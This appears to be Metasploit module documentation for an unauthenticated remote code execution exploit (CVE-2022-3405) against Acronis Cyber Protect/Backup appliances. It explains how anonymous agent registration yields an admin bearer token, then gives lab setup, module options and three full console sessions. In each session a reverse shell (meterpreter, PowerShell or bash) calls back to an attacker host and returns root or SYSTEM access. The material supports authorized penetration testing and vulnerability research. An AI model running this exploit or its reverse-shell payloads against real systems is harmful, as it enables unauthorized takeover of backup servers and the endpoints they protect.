## Vulnerable Application
Acronis Cyber Protect or Backup is an enterprise backup/recovery solution for all, compute, storage and application resources.
Businesses and Service Providers are using it to protect and backup all IT assets in their IT environment.
The Acronis Cyber Protect appliance, in its default configuration, allows the anonymous registration of new protect/backup agents
on new endpoints. This API endpoint also generates bearer tokens which the agent then uses to authenticate to the appliance.
As the management web console is running on the same port as the API for the agents, this bearer token is also valid for any actions
on the web console. This allows an attacker with network access to the appliance to start the registration of a new agent,
retrieve a bearer token that provides admin access to the available functions in the web console.

The web console contains multiple possibilities to execute arbitrary commands on both the agents (e.g., via PreCommands for a backup)
and also the appliance (e.g., via a Validation job on the agent of the appliance).
These options can easily be set with the provided bearer token, which leads to a complete compromise of all agents and the appliance
itself.

You can either use the module `auxiliary/gather/acronis_cyber_protect_machine_info_disclosure` to collect target info for exploitation
in this module. Or just run this module standalone and it will try to exploit the first online endpoint matching your target and
payload settings configured at the module.

Acronis Cyber Protect 15 (Windows, Linux) before build 29486 and
Acronis Cyber Backup 12.5 (Windows, Linux) before build 16545 are vulnerable.

The following releases were tested.

**Acronis Cyber Protect 15  ISO appliances:**
* Acronis Cyber Protect 15 Build 28503
* Acronis Cyber Protect 15 Build 27009
* Acronis Cyber Protect 15 Build 26981
* Acronis Cyber Protect 15 Build 26172

**Acronis Cyber Protect 12.5  ISO appliances:**
* Acronis Cyber Protect 12.5 Build 16428
* Acronis Cyber Protect 12.5 Build 16386
* Acronis Cyber Protect 12.5 Build 14330
* Acronis Cyber Protect 12.5 Build 11010

## Installation steps to install the Acronis Cyber Protect/Backup appliance
* Install the virtualization engine VMware Fusion on your preferred platform.
* [Install VMware Fusion on MacOS](https://knowledge.broadcom.com/external/article/315638/download-and-install-vmware-fusion.html).
* [Download ISO Image](https://care.acronis.com/s/article/71847-Acronis-Cyber-Protect-Links-to-download-installation-files?language=en_US).
* Install the Acronis iso image in your virtualization engine by unzipping the appliance image and import the `ovf` image.
* During the boot, select `Install appliance` and  configure the installation settings such as setting the root password and IP address
* using the option `change installation settings`.
* Boot up the VM and should be able to access the Acronis Cyber Protect/Backup appliance either thru the console, `ssh` on port `22`
* via the `webui` via `http://your_ip:9877`.
* Ensure that you have registered yourself on the Acronis Web site and applied for the 30-days trial for Acronis Cyber Protect.
* Login into the appliance via the `webui`.
* Follow the license instructions to apply your 30-day trial license.

You are now ready to test the module.

## Verification Steps
- [ ] Start `msfconsole`
- [ ] `modules/exploits/multi/acronis_cyber_protect_unauth_rce_cve_2022_3405`
- [ ] `set rhosts <ip-target>`
- [ ] `set lhost <attacker-ip>`
- [ ] `exploit`
- [ ] you should get a `shell` or `meterpreter` session depending on your settings.

## Options
These three options below are needed to target an specific endpoint registered on the Acronis Protect/Backup appliance.
This information can be collected using the recon module `auxiliary/gather/acronis_cyber_protect_machine_info_disclosure`.
This information is not mandatory for the module to run successfully.
You can also run this module standalone and it will try to exploit the first online endpoint matching your target
and payload settings configured at the module.
### HOSTID
HostId value collected from the recon module `auxiliary/gather/acronis_cyber_protect_machine_info_disclosure`.
### KEY
Key value collected from the recon module `auxiliary/gather/acronis_cyber_protect_machine_info_disclosure`.
### PARENTID
ParentId value collected from the recon module `auxiliary/gather/acronis_cyber_protect_machine_info_disclosure`.
### OUTPUT
You can use option `none` where no information is stored or printed to the console (default).
Choosing option `json` will store all information at a file in `json` format at the loot directory.
You can use this file in combination with `jq` for offline queries and processing.

## Scenarios
```msf
msf6 exploit(multi/acronis_cyber_protect_unauth_rce_cve_2022_3405) > info

       Name: Acronis Cyber Protect/Backup remote code execution
     Module: exploit/multi/acronis_cyber_protect_unauth_rce_cve_2022_3405
   Platform: Unix, Linux, Windows
       Arch: cmd
 Privileged: Yes
    License: Metasploit Framework License (BSD)
       Rank: Excellent
  Disclosed: 2022-11-08

Provided by:
  h00die-gr3y <h00die.gr3y@gmail.com>
  Sandro Tolksdorf of usd AG.

Module side effects:
 artifacts-on-disk
 ioc-in-logs

Module stability:
 crash-safe

Module reliability:
 repeatable-session

Available targets:
      Id  Name
      --  ----
  =>  0   Unix/Linux Command
      1   Windows Command

Check supported:
  Yes

Basic options:
  Name       Current Setting  Required  Description
  ----       ---------------  --------  -----------
  HOSTID                      no        hostId value collected from recon module "auxiliary/gather/a
                                        cronis_cyber_protect_machine_info_disclosure"
  KEY                         no        key value collected from recon module "auxiliary/gather/acro
                                        nis_cyber_protect_machine_info_disclosure"
  OUTPUT     none             yes       Output format to use (Accepted: none, json)
  PARENTID                    no        parentId value collected from recon module "auxiliary/gather
                                        /acronis_cyber_protect_machine_info_disclosure"
  Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
  RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/usi
                                        ng-metasploit/basics/using-metasploit.html
  RPORT      9877             yes       The target port (TCP)
  SSL        true             no        Negotiate SSL/TLS for outgoing connections
  TARGETURI  /                yes       The URI of the vulnerable Acronis Cyber Protect/Backup insta
                                        nce
  VHOST                       no        HTTP server virtual host

Payload information:

Description:
  Acronis Cyber Protect or Backup is an enterprise backup/recovery solution for all,
  compute, storage and application resources. Businesses and Service Providers are using it
  to protect and backup all IT assets in their IT environment.
  The Acronis Cyber Protect appliance, in its default configuration, allows the anonymous
  registration of new protect/backup agents on new endpoints. This API endpoint also
  generates bearer tokens which the agent then uses to authenticate to the appliance.
  As the management web console is running on the same port as the API for the agents, this
  bearer token is also valid for any actions on the web console. This allows an attacker
  with network access to the appliance to start the registration of a new agent, retrieve a
  bearer token that provides admin access to the available functions in the web console.

  The web console contains multiple possibilities to execute arbitrary commands on both the
  agents (e.g., via PreCommands for a backup) and also the appliance (e.g., via a Validation
  job on the agent of the appliance). These options can easily be set with the provided bearer
  token, which leads to a complete compromise of all agents and the appliance itself.

  You can either use the module `auxiliary/gather/acronis_cyber_protect_machine_info_disclosure`
  to collect target info for exploitation in this module. Or just run this module standalone and
  it will try to exploit the first online endpoint matching your target and payload settings
  configured at the module.

  Acronis Cyber Protect 15 (Windows, Linux) before build 29486 and
  Acronis Cyber Backup 12.5 (Windows, Linux) before build 16545 are vulnerable.

References:
  https://nvd.nist.gov/vuln/detail/CVE-2022-3405
  https://herolab.usd.de/security-advisories/usd-2022-0008/
  https://attackerkb.com/topics/WVI3r5eNIc/cve-2022-3405


View the full module info with the info -d command.
```
### Acronis Cyber Backup 12.5 build 14330 VMware appliance - Linux target
```msf
msf6 exploit(multi/acronis_cyber_protect_unauth_rce_cve_2022_3405) > set rhosts 192.168.201.6
rhosts => 192.168.201.6
msf6 exploit(multi/acronis_cyber_protect_unauth_rce_cve_2022_3405) > set target 0
target => 0
msf6 exploit(multi/acronis_cyber_protect_unauth_rce_cve_2022_3405) > set payload cmd/linux/http/x64/meterpreter/reverse_tcp
payload => cmd/linux/http/x64/meterpreter/reverse_tcp
msf6 exploit(multi/acronis_cyber_protect_unauth_rce_cve_2022_3405) > set FETCH_SRVHOST 192.168.201.8
FETCH_SRVHOST => 192.168.201.8
msf6 exploit(multi/acronis_cyber_protect_unauth_rce_cve_2022_3405) > set FETCH_WRITABLE_DIR /tmp
FETCH_WRITABLE_DIR => /tmp
msf6 exploit(multi/acronis_cyber_protect_unauth_rce_cve_2022_3405) > exploit

[*] Started reverse TCP handler on 192.168.201.8:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[!] The service is running, but could not be validated.
[*] Retrieve the first access token.
[*] Register a dummy backup agent.
[*] Dummy backup agent registration is successful.
[*] Retrieve the second access token.
[+] The target appears to be vulnerable. Acronis Cyber Protect/Backup 12.5.14330
[*] Retrieve first online target registered at the Acronis Cyber Protect/Backup appliance.
[*] Found online target matching your target setting Unix/Linux Command.
[+] hostId: 345C3F1E-92C3-4E92-8EF8-AC6BF136BB83
[+] parentId: phm-group.7C2057CC-8D32-40CA-9B83-4A8E73078F7F.disks
[+] key: phm.F70D1B08-5097-4CE5-8E22-F9E0DB75401F@345C3F1E-92C3-4E92-8EF8-AC6BF136BB83.disks
[*] type: machine
[*] hostname: AcronisAppliance-AC319
[*] IP: 192.168.201.6
[*] OS: GNU/Linux
[*] ARCH: linux
[*] ONLINE: true
[*] Import backup plan with payload for target with hostId: 345C3F1E-92C3-4E92-8EF8-AC6BF136BB83.
[*] Executing Unix/Linux Command with payload cmd/linux/http/x64/meterpreter/reverse_tcp
[*] Sending stage (3045380 bytes) to 192.168.201.6
[*] Meterpreter session 22 opened (192.168.201.8:4444 -> 192.168.201.6:60862) at 2024-10-23 12:35:44 +0000
[+] Backup plan is successful removed.

meterpreter > getuid
Server username: root
meterpreter > sysinfo
Computer     : 192.168.201.6
OS           : CentOS 7.4.1708 (Linux 3.10.0-693.11.6.el7.x86_64)
Architecture : x64
BuildTuple   : x86_64-linux-musl
Meterpreter  : x64/linux
meterpreter > pwd
/var/lib/Acronis/mms
meterpreter >
```
### Acronis Cyber Backup 12.5 build 14330 VMware appliance - Windows target
```msf
msf6 exploit(multi/acronis_cyber_protect_unauth_rce_cve_2022_3405) > set target 1
target => 1
msf6 exploit(multi/acronis_cyber_protect_unauth_rce_cve_2022_3405) > set output json
output => json
msf6 exploit(multi/acronis_cyber_protect_unauth_rce_cve_2022_3405) > set payload cmd/windows/reverse_powershell
payload => cmd/windows/reverse_powershell
msf6 exploit(multi/acronis_cyber_protect_unauth_rce_cve_2022_3405) > exploit

[*] Started reverse TCP handler on 192.168.201.8:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[!] The service is running, but could not be validated.
[*] Retrieve the first access token.
[*] Register a dummy backup agent.
[*] Dummy backup agent registration is successful.
[*] Retrieve the second access token.
[+] The target appears to be vulnerable. Acronis Cyber Protect/Backup 12.5.14330
[*] Retrieve first online target registered at the Acronis Cyber Protect/Backup appliance.
[+] Configuration details are successfully saved in json format to /root/.msf4/loot/20241023124641_default_192.168.201.6_acronis.cyber.pr_949551.bin
[*] Found online target matching your target setting Windows Command.
[+] hostId: 28BAFD9F-F9F1-481F-A970-1A6ED70736AC
[+] parentId: phm-group.7C2057CC-8D32-40CA-9B83-4A8E73078F7F.disks
[+] key: phm.0CA16CD4-1C6D-44D2-BEF1-B9F146005EE1@28BAFD9F-F9F1-481F-A970-1A6ED70736AC.disks
[*] type: machine
[*] hostname: WIN-BJDNH44EEDB
[*] IP: 192.168.201.5
[*] OS: Microsoft Windows Server 2019 Standard
[*] ARCH: windows
[*] ONLINE: true
[*] Import backup plan with payload for target with hostId: 28BAFD9F-F9F1-481F-A970-1A6ED70736AC.
[*] Executing Windows Command with payload cmd/windows/reverse_powershell
[*] Command shell session 23 opened (192.168.201.8:4444 -> 192.168.201.5:49780) at 2024-10-23 12:46:51 +0000
[+] Backup plan is successful removed.


Shell Banner:
Microsoft Windows [Version 10.0.17763.107]
-----


C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>systeminfo
systeminfo

Host Name:                 WIN-BJDNH44EEDB
OS Name:                   Microsoft Windows Server 2019 Standard
OS Version:                10.0.17763 N/A Build 17763
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:
Product ID:                00429-70000-00000-AA946
Original Install Date:     1/26/2023, 10:05:52 AM
System Boot Time:          10/23/2024, 2:44:05 PM
System Manufacturer:       innotek GmbH
System Model:              VirtualBox
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: Intel64 Family 6 Model 158 Stepping 13 GenuineIntel ~2307 Mhz
BIOS Version:              innotek GmbH VirtualBox, 12/1/2006
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+01:00) Amsterdam, Berlin, Bern, Rome, Stockholm, Vienna
Total Physical Memory:     2,048 MB
Available Physical Memory: 475 MB
Virtual Memory: Max Size:  4,224 MB
Virtual Memory: Available: 2,800 MB
Virtual Memory: In Use:    1,424 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              N/A
Hotfix(s):                 1 Hotfix(s) Installed.
                           [01]: KB4464455
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) PRO/1000 MT Desktop Adapter
                                 Connection Name: Ethernet
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 192.168.201.5
                                 [02]: fe80::85ec:4690:3774:2b6b
                                 [03]: fdf7:94fa:75b3:fe44:85ec:4690:3774:2b6b
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.

C:\Windows\system32>
```
### Acronis Cyber Backup 15 build 27009 VMware appliance - Linux target
```msf
msf6 exploit(multi/acronis_cyber_protect_unauth_rce_cve_2022_3405) > set rhosts 192.168.201.6
rhosts => 192.168.201.6
msf6 exploit(multi/acronis_cyber_protect_unauth_rce_cve_2022_3405) > set target 0
target => 0
msf6 exploit(multi/acronis_cyber_protect_unauth_rce_cve_2022_3405) > set payload cmd/unix/reverse_bash
payload => cmd/unix/reverse_bash
msf6 exploit(multi/acronis_cyber_protect_unauth_rce_cve_2022_3405) > exploit

[*] Started reverse TCP handler on 192.168.201.8:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[!] The service is running, but could not be validated.
[*] Retrieve the first access token.
[*] Register a dummy backup agent.
[*] Dummy backup agent registration is successful.
[*] Retrieve the second access token.
[+] The target appears to be vulnerable. Acronis Cyber Protect/Backup 15.0.27009
[*] Retrieve first online target registered at the Acronis Cyber Protect/Backup appliance.
[*] Found online target matching your target setting Unix/Linux Command.
[+] hostId: D287E868-EDBB-4FE9-85A9-F928AA10EE5D
[+] parentId: 00000000-0000-0000-0000-000000000000
[+] key: phm.EA9A6E26-38B5-4727-9957-FD7CDD7BF2CC@D287E868-EDBB-4FE9-85A9-F928AA10EE5D.disks
[*] type: machine
[*] hostname: AcronisAppliance-FCD94
[*] IP: 192.168.201.6
[*] OS: Linux: CentOS Linux release 7.6.1810 (Core)
[*] ARCH: linux
[*] ONLINE: true
[*] Import backup plan with payload for target with hostId: D287E868-EDBB-4FE9-85A9-F928AA10EE5D.
[*] Executing Unix/Linux Command with payload cmd/unix/reverse_bash
[*] Command shell session 21 opened (192.168.201.8:4444 -> 192.168.201.6:35722) at 2024-10-23 12:20:05 +0000
[+] Backup plan is successful removed.

uname -a
Linux AcronisAppliance-FCD94 3.10.0-957.27.2.el7.x86_64 #1 SMP Mon Jul 29 17:46:05 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
id
uid=0(root) gid=0(root) groups=0(root)
pwd
/var/lib/Acronis/mms
```

## Limitations
In some occasions, the exploit might fail.
Adjust the `WfsDelay` advanced option might help.
